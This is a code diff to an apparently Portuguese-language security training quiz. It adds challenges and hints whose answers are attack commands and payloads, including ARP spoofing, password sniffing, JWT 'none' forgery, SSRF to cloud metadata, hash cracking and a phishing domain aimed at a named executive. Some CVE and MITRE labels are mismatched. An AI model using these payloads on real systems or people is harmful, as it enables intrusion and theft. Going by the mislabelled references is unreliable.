@@ -16,7 +16,13 @@ class ProceduralAI {
             buffer_overflow: { weight: 10, templates: 15 },
             lfi_rfi: { weight: 12, templates: 14 },
             csrf: { weight: 8, templates: 10 },
-            open_redirect: { weight: 5, templates: 8 }
+            open_redirect: { weight: 5, templates: 8 },
+            network_hacking: { weight: 15, templates: 10 },
+            api_security: { weight: 12, templates: 10 },
+            cloud_security: { weight: 10, templates: 8 },
+            social_engineering: { weight: 8, templates: 6 },
+            cryptography: { weight: 7, templates: 6 },
+            mobile_security: { weight: 8, templates: 6 }
         };
         
         this.templates = this.loadTemplates();
@@ -224,6 +230,102 @@ class ProceduralAI {
                     vulnerableCode: "xmlDoc.loadXML(xmlString);",
                     solution: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", exploitType: 'xxe'
                 }
+            ],
+            network_hacking: [
+                {
+                    id: 'net-1', description: 'Realize reconhecimento de rede. Identifique portas abertas no alvo 192.168.1.1.',
+                    vulnerableCode: "# Target: 192.168.1.1\n# Objetivo: Descubra serviços expostos\n$ nmap [flags] 192.168.1.1",
+                    solution: "nmap -sV -sC -A 192.168.1.1", exploitType: 'network_recon',
+                    mitre: 'T1046 - Network Service Scanning'
+                },
+                {
+                    id: 'net-2', description: 'Ataque ARP Spoofing para interceptar tráfego na LAN.',
+                    vulnerableCode: "# Rede: 192.168.0.0/24\n# Gateway: 192.168.0.1\n# Vítima: 192.168.0.10\n$ arpspoof [flags] -i eth0",
+                    solution: "arpspoof -i eth0 -t 192.168.0.10 192.168.0.1", exploitType: 'arp_spoofing',
+                    mitre: 'T1557 - Adversary-in-the-Middle'
+                },
+                {
+                    id: 'net-3', description: 'Sniffing de credenciais em tráfego HTTP não criptografado.',
+                    vulnerableCode: "POST /login HTTP/1.1\nHost: internal.corp.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=???",
+                    solution: "tcpdump -i eth0 -A 'port 80' | grep -i 'password'", exploitType: 'credential_sniffing',
+                    mitre: 'T1040 - Network Sniffing'
+                }
+            ],
+            api_security: [
+                {
+                    id: 'api-1', description: 'API sem rate limiting permite enumerar IDs de usuários.',
+                    vulnerableCode: "GET /api/v1/users/{id}\nAuthorization: Bearer eyJhbGciOiJub25lIn0.e30.",
+                    solution: "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIn0.", exploitType: 'broken_api_auth',
+                    mitre: 'T1078 - Valid Accounts'
+                },
+                {
+                    id: 'api-2', description: 'Vulnerabilidade de Mass Assignment: API aceita campos extras não esperados.',
+                    vulnerableCode: "PUT /api/v1/profile\nBody: {\"name\": \"hacker\", \"role\": \"user\"}",
+                    solution: "{\"name\": \"hacker\", \"role\": \"admin\", \"isVerified\": true}", exploitType: 'mass_assignment',
+                    mitre: 'T1548 - Abuse Elevation Control Mechanism'
+                },
+                {
+                    id: 'api-3', description: 'JWT com algoritmo "none" permite bypass de autenticação.',
+                    vulnerableCode: "// Token atual:\n// Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}\n// Payload: {\"sub\":\"guest\",\"role\":\"user\"}",
+                    solution: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.", exploitType: 'jwt_none_alg',
+                    mitre: 'T1600 - Weaken Encryption'
+                }
+            ],
+            cloud_security: [
+                {
+                    id: 'cloud-1', description: 'SSRF para acessar serviço de metadata da AWS e roubar credenciais IAM.',
+                    vulnerableCode: "# Endpoint vulnerável a SSRF:\nGET /fetch?url=http://???/latest/meta-data/iam/security-credentials/",
+                    solution: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", exploitType: 'cloud_ssrf',
+                    mitre: 'T1552.005 - Cloud Instance Metadata API'
+                },
+                {
+                    id: 'cloud-2', description: 'Bucket S3 com permissão pública permite listar e baixar dados sensíveis.',
+                    vulnerableCode: "# Bucket: s3://corp-backups-prod\n# ACL: public-read\n$ aws s3 [comando] s3://corp-backups-prod",
+                    solution: "aws s3 ls s3://corp-backups-prod --no-sign-request", exploitType: 's3_misconfiguration',
+                    mitre: 'T1530 - Data from Cloud Storage'
+                }
+            ],
+            social_engineering: [
+                {
+                    id: 'se-1', description: 'Construa um email de phishing convincente para obter credenciais do alvo.',
+                    vulnerableCode: "# Alvo: CEO João Silva <joao.silva@corp.com>\n# Domínio legítimo: corp.com\n# Domínio falso: ???\n# Pretexto: 'Atualização urgente de senha corporativa'",
+                    solution: "c0rp.com (homoglyph attack: substituindo 'o' por '0')", exploitType: 'phishing_domain',
+                    mitre: 'T1566.001 - Spearphishing Attachment'
+                },
+                {
+                    id: 'se-2', description: 'Ataque de pretexting: um "técnico de TI" liga pedindo senha temporária.',
+                    vulnerableCode: "// Vetor: Engenharia Social por telefone\n// Pretexto: 'Suporte Técnico urgente'\n// Alvo: Funcionário do helpdesk\n// Objetivo: Obter reset de senha do CEO",
+                    solution: "Vishing com spoofing de caller ID do número interno de TI", exploitType: 'vishing',
+                    mitre: 'T1598 - Phishing for Information'
+                }
+            ],
+            cryptography: [
+                {
+                    id: 'crypto-1', description: 'Aplicação usa MD5 para hash de senhas. Quebre o hash do admin.',
+                    vulnerableCode: "# Hash encontrado no banco:\n# admin: 5f4dcc3b5aa765d61d8327deb882cf99\n# Algoritmo: MD5 (sem salt)\n$ hashcat -m [modo] hash.txt wordlist.txt",
+                    solution: "hashcat -m 0 5f4dcc3b5aa765d61d8327deb882cf99 rockyou.txt", exploitType: 'weak_hash_cracking',
+                    mitre: 'T1110.002 - Password Cracking'
+                },
+                {
+                    id: 'crypto-2', description: 'Ataque Padding Oracle: decripte dados criptografados com CBC sem autenticação.',
+                    vulnerableCode: "# Token de sessão (base64):\n# K2NyeXB0b3MgaXMgaGFyZA==\n# Cifra: AES-128-CBC\n# IV: 0000000000000000\n# Sem HMAC de autenticação",
+                    solution: "padbuster http://alvo.com/token K2NyeXB0b3MgaXMgaGFyZA== 16", exploitType: 'padding_oracle',
+                    mitre: 'T1600 - Weaken Encryption'
+                }
+            ],
+            mobile_security: [
+                {
+                    id: 'mob-1', description: 'App Android exporta Activity sem permissão. Acesse dados do usuário.',
+                    vulnerableCode: "<!-- AndroidManifest.xml -->\n<activity android:name=\".AdminActivity\"\n          android:exported=\"true\">\n</activity>",
+                    solution: "adb shell am start -n com.target.app/.AdminActivity", exploitType: 'intent_hijacking',
+                    mitre: 'T1426 - System Information Discovery'
+                },
+                {
+                    id: 'mob-2', description: 'WebView no app carrega URLs externas sem validação. Execute XSS.',
+                    vulnerableCode: "webView.loadUrl(getIntent().getStringExtra(\"url\"));\nwebView.getSettings().setJavaScriptEnabled(true);",
+                    solution: "javascript:alert(document.cookie)", exploitType: 'webview_xss',
+                    mitre: 'T1411 - User Interface Spoofing'
+                }
             ]
         };
     }
@@ -241,9 +343,20 @@ class ProceduralAI {
 
     loadCVEDatabase() {
         return {
-            injection: ['CVE-2023-1234', 'CVE-2021-22986', 'CVE-2021-44228'],
-            xss: ['CVE-2023-28121', 'CVE-2022-3602'],
-            rce: ['CVE-2021-44228', 'CVE-2022-22965']
+            injection: ['CVE-2024-21514 (OpenCart SQLi)', 'CVE-2021-22986 (F5 BIG-IP)', 'CVE-2021-44228 (Log4Shell)'],
+            xss: ['CVE-2023-28121 (WooCommerce XSS)', 'CVE-2024-4358 (Telerik XSS)', 'CVE-2022-3602 (OpenSSL)'],
+            rce: ['CVE-2021-44228 (Log4Shell RCE)', 'CVE-2022-22965 (Spring4Shell)', 'CVE-2024-24813 (Apache Tomcat RCE)', 'CVE-2025-53770 (SharePoint RCE)'],
+            auth: ['CVE-2024-55591 (FortiOS Auth Bypass)', 'CVE-2024-45409 (Ruby-SAML Bypass)', 'CVE-2025-29927 (Next.js Middleware Bypass)'],
+            ssrf: ['CVE-2021-26855 (ProxyLogon SSRF)', 'CVE-2019-11043 (PHP-FPM SSRF)'],
+            lfi_rfi: ['CVE-2024-38475 (Apache mod_rewrite)', 'CVE-2021-41773 (Apache Path Traversal)'],
+            deserialization: ['CVE-2015-4852 (Java Deserialization)', 'CVE-2020-2555 (Oracle Coherence)'],
+            buffer_overflow: ['CVE-2021-3156 (Sudo Heap BoF)', 'CVE-2023-4911 (Looney Tunables glibc)'],
+            network_hacking: ['CVE-2024-3400 (PAN-OS Command Injection)', 'CVE-2023-20198 (Cisco IOS XE)'],
+            api_security: ['CVE-2023-25690 (Apache HTTP API)', 'CVE-2024-27198 (JetBrains TeamCity)'],
+            cloud_security: ['CVE-2022-47939 (AWS Log4j)', 'CVE-2023-44487 (HTTP/2 Rapid Reset - DDoS)'],
+            social_engineering: ['MITRE T1566 (Phishing)', 'MITRE T1598 (Spearphishing via Service)'],
+            cryptography: ['CVE-2023-0286 (OpenSSL X.509 Overflow)', 'CVE-2022-0778 (OpenSSL Infinite Loop)'],
+            mobile_security: ['CVE-2023-41064 (Apple WebKit RCE)', 'CVE-2023-32434 (iOS Kernel Priv Esc)']
         };
     }
 
@@ -277,12 +390,24 @@ class ProceduralAI {
 
     generateHint(challenge) {
         const hints = {
-            injection: "Tente condições booleanas (OR 1=1) ou UNION SELECT para extrair dados.",
-            xss: "Procure por saídas não escapadas. O contexto HTML é fundamental.",
-            rce: "Separadores de comando: ; | && ||. Tente concatenar comandos do sistema.",
-            buffer_overflow: "Calcule o offset exato para sobrescrever o registrador EIP/RIP."
+            injection: "Use sqlmap: sqlmap -u 'http://alvo.com/page?id=1' --dbs. Tente OR 1=1, UNION SELECT ou Blind SQLi.",
+            xss: "Burp Suite > Intercept > Modifique o parâmetro. Tente <script>, <img onerror=>, <svg onload=>.",
+            rce: "Separadores de comando: ; | && ||. Use Metasploit: search cmd_injection. Tente concatenar comandos.",
+            buffer_overflow: "Use pattern_create do Metasploit para calcular offset. Sobrescreva EIP com endereço de retorno.",
+            auth: "Tente manipular cookies/tokens. Use Burp Repeater para testar diferentes valores de sessão.",
+            ssrf: "Alvos internos: 127.0.0.1, 169.254.169.254 (AWS metadata), 10.0.0.1. Use schemas file://, dict://.",
+            lfi_rfi: "Tente ../../../etc/passwd, path traversal com %2e%2e%2f, e null byte %00 para bypass.",
+            csrf: "Crie um formulário HTML auto-submit apontando para a ação vulnerável sem verificação de token.",
+            deserialization: "Identifique o formato (Java, PHP, Python Pickle). Use ysoserial para Java. Gere gadget chains.",
+            idor: "Modifique IDs numéricos, GUIDs, hashes. Use Burp Intruder para enumerar referências de objetos.",
+            network_hacking: "Use nmap -sV -sC para reconhecimento. Para MITM: arpspoof + Wireshark/tcpdump para captura.",
+            api_security: "Teste JWT em jwt.io. Tente alg=none. Burp Suite para interceptar e modificar chamadas de API.",
+            cloud_security: "SSRF para 169.254.169.254. AWS CLI para testar permissões: aws s3 ls --no-sign-request.",
+            social_engineering: "Crie pretexto convincente. Pesquise o alvo no LinkedIn/OSINT. Use typosquatting de domínio.",
+            cryptography: "Use hashcat com wordlists rockyou.txt. Identifique o algoritmo pelo tamanho/formato do hash.",
+            mobile_security: "Use adb para inspecionar apps Android. Jadx/APKTool para decompilação. Frida para hooking."
         };
-        return hints[challenge.category] || "Analise o padrão de código vulnerável fornecido.";
+        return hints[challenge.category] || "Analise o padrão de código vulnerável fornecido e identifique o vetor de ataque.";
     }
 
     saveProgress() {
@@ -354,7 +479,11 @@ class ProceduralAI {
             idor: ["?id=0", "?user=guest", "?profile=null", "/api/v1/debug"],
             ssrf: ["http://localhost:8080", "file:///etc/hosts", "dict://127.0.0.1:11211", "http://127.0.0.1/admin"],
             lfi_rfi: ["index.php", "config.php", "/var/www/html/index.php", "php://filter/read=convert.base64-encode/resource=config"],
-            csrf: ["<form>", "submit()", "fetch('/api')", "XMLHttpRequest.send()"]
+            csrf: ["<form>", "submit()", "fetch('/api')", "XMLHttpRequest.send()"],
+            auth: ["Cookie: user=guest", "Header: X-Auth-False", "Session: {id:0}", "Token: null"],
+            deserialization: ["{\"user\":\"admin\"}", "O:4:\"Test\":0:{}", "new Buffer('abc')", "eval('1+1')"],
+            open_redirect: ["/logout", "/home", "http://internal-site.local", "javascript:history.back()"],
+            xxe: ["<!ENTITY test '123'>", "<foo>bar</foo>", "<?xml version='1.1'?>", "<!ELEMENT doc ANY>"]
         };
         
         const choices = wrongAnswers[category] || ["Opção inválida 1", "Opção inválida 2", "Opção inválida 3", "Opção inválida 4"];
@@ -374,11 +503,6 @@ document.addEventListener('DOMContentLoaded', () => {
 });
 
 // Export
-window.ProceduralAI = ProceduralAI;
-window.procAI = procAI;
-
-
-// Export for HTML integration
 window.ProceduralAI = ProceduralAI;
 window.procAI = procAI;
 
